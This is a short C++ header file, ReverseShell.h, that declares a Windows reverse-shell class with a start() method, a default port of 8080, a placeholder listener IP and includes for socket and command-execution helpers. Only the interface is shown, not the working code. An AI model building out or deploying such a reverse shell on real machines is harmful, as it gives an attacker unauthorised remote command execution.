// ReverseShell.h
#pragma once
#include "WinSockManager.h"
#include "SocketHandler.h"
#include "CommandExecutor.h"

class ReverseShell {
    static constexpr int DEFAULT_BUFLEN = 1024;
    static constexpr int DEFAULT_PORT = 8080;
    const char* DEFAULT_IP = "192.168.0.X";
    
public:
    void start();
};
